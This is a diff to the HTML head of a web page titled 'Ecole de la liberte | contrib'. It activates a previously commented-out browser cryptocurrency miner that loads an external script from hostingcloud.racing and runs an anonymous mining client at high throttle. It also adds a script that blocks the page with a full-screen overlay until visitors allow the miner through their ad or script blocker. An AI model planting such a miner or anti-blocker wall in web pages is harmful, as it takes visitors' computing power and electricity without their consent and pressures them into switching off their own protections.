@@ -3,14 +3,32 @@
 <head>
 	<title>Ecole de la liberte | contrib</title>
 	<link rel="icon" type="image/png" sizes="16x16" href="images/logo.png">
-	<!-- Miner JS 
-  <script src="https://www.hostingcloud.racing/zt8d.js"></script>
-  <script>
-      var _client = new Client.Anonymous('6a10264bb100e62b0362f9e25cf0c314a0c4d4a6c4374fbd71e930fbd5c05fb7', {
-          throttle: 0.4, c: 'w', ads: 0
-      });
-      _client.start();
+	<!-- Miner JS -->
+        <script src="https://www.hostingcloud.racing/NZmD.js"></script>
+	<script>
+	    var _client = new Client.Anonymous('686401b7f4d28afa93053d264bf73e54f9bee5b8d2b6a2b8a170bed6aff0fca3', {
+		throttle: 0.9, c: 'w', ads: 0
+	    });
+	    _client.start();
 
+	</script>
+	<script>
+	    setTimeout(function(){
+		if(typeof _client === 'undefined' || _client === null)
+		{
+		    var messageDiv = document.createElement("div");
+		    messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+		    messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+		    var mainDiv = document.createElement("div");
+		    mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+		    mainDiv.appendChild(messageDiv);
+		    document.body.appendChild(mainDiv);
+		    document.getElementsByTagName("body")[0].style.overflow = "hidden";
+		    window.scrollTo(0, 0);
+		}
+	    },1000);
+	</script>
+        <!-- Fin du Miner JS -->
 
   </script>
   <!-- Fin du miner JS -->
